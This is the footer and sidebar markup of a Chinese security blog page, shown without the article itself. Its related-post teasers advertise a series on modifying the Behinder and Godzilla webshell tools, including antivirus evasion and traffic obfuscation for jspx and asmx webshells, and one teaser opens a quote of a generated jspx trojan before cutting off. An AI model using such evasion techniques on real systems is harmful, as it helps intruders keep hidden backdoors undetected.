src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">冰蝎二开从0到1-2(免杀)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="冰蝎二开从0到1-2(免杀)"><img class="cover" src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-06</div><div class="info-item-2">冰蝎二开从0到1-2(免杀)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="info-item-2">哥斯拉二开从0到1-6(jspx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。 jspx简介JSPX (JavaServer Pages XML) 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。 看起来是aspx和asmx的关系差不多。就是XML版本的。 jspx免杀我们先来看一下Godzilla的jspx生成原版木马 12&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:declaration&gt; String...</div></div></div></a><a class="pagination-related" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-24</div><div class="info-item-2">哥斯拉二开从0到1-5(asmx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下asmx流量修改及免杀。 asmx简介ASMX 文件是一个用于在 ASP.NET Web 服务中定义和处理请求的文件格式。它通常用于创建基于 XML 的 Web 服务，允许客户端与服务器进行远程交互，传输数据并执行方法。ASMX 文件通常包含服务的代码和定义，用来处理 Web 服务的请求和响应。 Web 服务（也叫做 XML Web Service）是一种能够接收来自互联网或局域网中其他系统的请求，提供轻量级通信的独立技术。Web 服务通过 SOAP 协议在 Web 上提供功能，通常由 WSDL 文件描述，并通过 UDDI 注册。  SOAP（简单对象访问协议）：它是 XML Web 服务的通信协议，定义了如何通过 HTTP 或其他底层协议来调用 Web 服务中的方法。SOAP 使用 XML 格式的消息进行通信。 WSDL（Web 服务描述语言）：一个 XML 文档，用于描述 Web 服务的操作以及如何交换数据。WSDL 文件通常由软件自动生成，并且可以通过 UDDI...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%B9%E6%A0%87%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">改标题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E6%94%B9%E9%80%A0"><span class="toc-number">4.</span> <span class="toc-text">全局改造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E4%B8%AA%E7%89%88%E6%9C%AC"><span class="toc-number">6.</span> <span class="toc-text">下个版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E3%80%81%E4%BD%BF%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">下载、使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number">8.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="冰蝎二开从0到1-2(免杀)"><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="冰蝎二开从0到1-2(免杀)"/></a><div class="content"><a class="title" href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="冰蝎二开从0到1-2(免杀)">冰蝎二开从0到1-2(免杀)</a><time datetime="2025-07-05T18:39:55.000Z" title="发表于 2025-07-06 02:39:55">2025-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1"><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="冰蝎二开从0到1"/></a><div class="content"><a class="title" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1">冰蝎二开从0到1</a><time datetime="2025-06-19T08:52:04.000Z" title="发表于 2025-06-19 16:52:04">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const destroyWaline = ele => ele.destroy()

  const initWaline = (Fn, el = document, path = window.location.pathname) => {
    const waline = Fn({
      el: el.querySelector('#waline-wrap'),
      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      comment: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyWaline = () => {
        destroyWaline(waline)
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const loadWaline = (el, path) => {
    if (initFn) initWaline(initFn, el, path)
    else {
      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
        .then(({ init }) => {
          initFn = init || Waline.init
          initWaline(initFn, el, path)
          window.walineFn = initFn
        })
    }
  }

  if (isShuoshuo) {
    'Waline' === 'Waline'
      ? window.shuoshuoComment = { loadComment: loadWaline } 
      : window.loadOtherComment = loadWaline
    return
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: true,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/lite/builds/browser.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
            var git_user ="Bohemiana";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>